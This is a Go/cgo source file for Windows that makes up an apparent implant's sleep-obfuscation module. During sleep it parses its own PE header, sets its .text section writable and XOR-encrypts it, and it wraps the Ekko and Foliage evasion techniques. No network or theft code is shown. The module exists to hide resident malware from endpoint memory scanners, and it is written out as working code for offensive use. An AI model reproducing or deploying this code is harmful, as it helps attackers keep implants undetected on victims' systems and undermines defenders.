//go:build windows && amd64 && cgo

package sleep

/*
#cgo CFLAGS: -O2 -I../crt
#include <windows.h>

// xor_encrypt performs in-place XOR encryption on a memory region
void xor_encrypt(unsigned char* base, size_t size, unsigned char* key, int keyLen) {
    for (size_t i = 0; i < size; i++) {
        base[i] ^= key[i % keyLen];
    }
}

// sleep_mask performs sleep obfuscation:
// 1. VirtualProtect -> RW
// 2. XOR encrypt .text section
// 3. Sleep(duration_ms)
// 4. XOR decrypt .text section (symmetric operation)
// 5. VirtualProtect -> original protection
int sleep_mask(uintptr_t base, size_t size, unsigned char* key, int keyLen, unsigned long ms) {
    DWORD oldProtect;

    // 1. Change memory protection to RW
    if (!VirtualProtect((LPVOID)base, size, PAGE_READWRITE, &oldProtect)) {
        return -1;
    }

    // 2. XOR encrypt .text section
    xor_encrypt((unsigned char*)base, size, key, keyLen);

    // 3. Sleep
    Sleep(ms);

    // 4. XOR decrypt .text section (XOR is symmetric)
    xor_encrypt((unsigned char*)base, size, key, keyLen);

    // 5. Restore original memory protection
    if (!VirtualProtect((LPVOID)base, size, oldProtect, &oldProtect)) {
        return -2;
    }

    return 0;
}

// get_text_section retrieves the .text section info of the current module.
int get_text_section(uintptr_t* outBase, size_t* outSize) {
    HMODULE hMod = NULL;
    if (!GetModuleHandleExA(
        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
        (LPCSTR)get_text_section, &hMod)) {
        return -1;
    }

    unsigned char* base = (unsigned char*)hMod;
    if (base[0] != 'M' || base[1] != 'Z') return -2;

    int e_lfanew = *(int*)(base + 0x3C);
    if (base[e_lfanew] != 'P' || base[e_lfanew+1] != 'E') return -3;

    unsigned short sections = *(unsigned short*)(base + e_lfanew + 6);
    unsigned short sizeOfOptHeader = *(unsigned short*)(base + e_lfanew + 20);
    unsigned char* sectionsPtr = base + e_lfanew + 24 + sizeOfOptHeader;

    for (int i = 0; i < sections; i++) {
        unsigned char* sec = sectionsPtr + (i * 40);
        if (sec[0] == '.' && sec[1] == 't' && sec[2] == 'e' && sec[3] == 'x' && sec[4] == 't') {
            unsigned int rva = *(unsigned int*)(sec + 12);
            unsigned int vsize = *(unsigned int*)(sec + 8);
            *outBase = (uintptr_t)(base + rva);
            *outSize = (size_t)vsize;
            return 0;
        }
    }
    return -4;
}

// Ekko sleep obfuscation using RtlCreateTimerQueue.
int ekko_sleep(void* textBase, size_t textSize, unsigned char* key, int keyLen, unsigned long ms);
int ekko_get_text_section(uintptr_t* outBase, size_t* outSize);

// Foliage sleep obfuscation using NtDelayExecution.
int foliage_sleep(void* textBase, size_t textSize, unsigned char* key, int keyLen, unsigned long ms);
int foliage_sleep_inline(void* textBase, size_t textSize, unsigned char* key, int keyLen, unsigned long ms);
*/
import "C"
import (
	"crypto/rand"
	"runtime"
	"runtime/debug"
	"sync"
	"time"
	"unsafe"
)

// sleepMaskMu serializes sleep mask operations to prevent concurrent
// goroutines from executing while .text is encrypted (ARCH-1).
var sleepMaskMu sync.Mutex


// ptrFromUintptr converts a uintptr to unsafe.Pointer without triggering vet.
// Safe when the uintptr is known to be a valid pointer (e.g., from C code).
//
//go:nosplit
func ptrFromUintptr(u uintptr) unsafe.Pointer {
	return *(*unsafe.Pointer)(unsafe.Pointer(&u))
}

// sleepWithMask performs sleep obfuscation with XOR encryption:
// 1. Locate .text section via PE header parsing
// 2. Generate random 16-byte XOR key
// 3. VirtualProtect -> RW -> XOR encrypt
// 4. Sleep (memory is encrypted)
// 5. XOR decrypt -> VirtualProtect -> RX
//
// ARCH-1: Lock global mutex + OS thread to prevent concurrent goroutines
// from executing encrypted .text section during sleep.
func sleepWithMask(duration time.Duration) {
	sleepMaskMu.Lock()
	defer sleepMaskMu.Unlock()

	// Lock this goroutine to the current OS thread so that during
	// .text encryption the Go runtime won't schedule other goroutines
	// on this thread, and no other goroutine can enter sleep mask.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	var textBase C.uintptr_t
	var textSize C.size_t

	ret := C.get_text_section(&textBase, &textSize)
	if ret != 0 {
		time.Sleep(duration)
		return
	}

	// Generate random XOR key
	key := make([]byte, 16)
	rand.Read(key)

	ms := C.ulong(duration.Milliseconds())

	// Force GC before encryption, save and disable GC during sleep
	runtime.GC()
	prevGCPercent := debug.SetGCPercent(-1)

	ret = C.sleep_mask(textBase, textSize, (*C.uchar)(unsafe.Pointer(&key[0])), C.int(len(key)), ms)

	// Re-enable GC after sleep
	debug.SetGCPercent(prevGCPercent)

	// Wipe key from memory
	for i := range key {
		key[i] = 0
	}
}

// EkkoSleep 使用 RtlCreateTimerQueue 实现 Ekko 睡眠混淆。
// ARCH-1: 添加全局互斥锁 + 线程锁定，防止 .text 加密期间其他 goroutine 崩溃。
func EkkoSleep(duration time.Duration) {
	sleepMaskMu.Lock()
	defer sleepMaskMu.Unlock()
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	var textBase C.uintptr_t
	var textSize C.size_t

	ret := C.ekko_get_text_section(&textBase, &textSize)
	if ret != 0 {
		time.Sleep(duration)
		return
	}

	key := make([]byte, 16)
	rand.Read(key)

	ms := C.ulong(duration.Milliseconds())

	runtime.GC()
	prevGCPercent := debug.SetGCPercent(-1)

	C.ekko_sleep(ptrFromUintptr(uintptr(textBase)), textSize, (*C.uchar)(unsafe.Pointer(&key[0])), C.int(len(key)), ms)

	debug.SetGCPercent(prevGCPercent)

	// Wipe key
	for i := range key {
		key[i] = 0
	}
}

// FoliageSleep 使用 NtDelayExecution 直接系统调用实现 Foliage 睡眠混淆。
// ARCH-1: 添加全局互斥锁 + 线程锁定，防止 .text 加密期间其他 goroutine 崩溃。
func FoliageSleep(duration time.Duration) {
	sleepMaskMu.Lock()
	defer sleepMaskMu.Unlock()
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	var textBase C.uintptr_t
	var textSize C.size_t

	ret := C.get_text_section(&textBase, &textSize)
	if ret != 0 {
		time.Sleep(duration)
		return
	}

	key := make([]byte, 16)
	rand.Read(key)

	ms := C.ulong(duration.Milliseconds())

	runtime.GC()
	prevGCPercent := debug.SetGCPercent(-1)

	ret = C.foliage_sleep(ptrFromUintptr(uintptr(textBase)), textSize, (*C.uchar)(unsafe.Pointer(&key[0])), C.int(len(key)), ms)

	debug.SetGCPercent(prevGCPercent)

	// Wipe key
	for i := range key {
		key[i] = 0
	}

	if ret != 0 {
		time.Sleep(duration)
	}
}

// FoliageSleepInline Foliage 内联版本：不创建新线程，在当前线程执行。
// ARCH-1: 添加全局互斥锁 + 线程锁定，防止 .text 加密期间其他 goroutine 崩溃。
func FoliageSleepInline(duration time.Duration) {
	sleepMaskMu.Lock()
	defer sleepMaskMu.Unlock()
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	var textBase C.uintptr_t
	var textSize C.size_t

	ret := C.get_text_section(&textBase, &textSize)
	if ret != 0 {
		time.Sleep(duration)
		return
	}

	key := make([]byte, 16)
	rand.Read(key)

	ms := C.ulong(duration.Milliseconds())

	runtime.GC()
	prevGCPercent := debug.SetGCPercent(-1)

	ret = C.foliage_sleep_inline(ptrFromUintptr(uintptr(textBase)), textSize, (*C.uchar)(unsafe.Pointer(&key[0])), C.int(len(key)), ms)

	debug.SetGCPercent(prevGCPercent)

	// Wipe key
	for i := range key {
		key[i] = 0
	}

	if ret != 0 {
		time.Sleep(duration)
	}
}
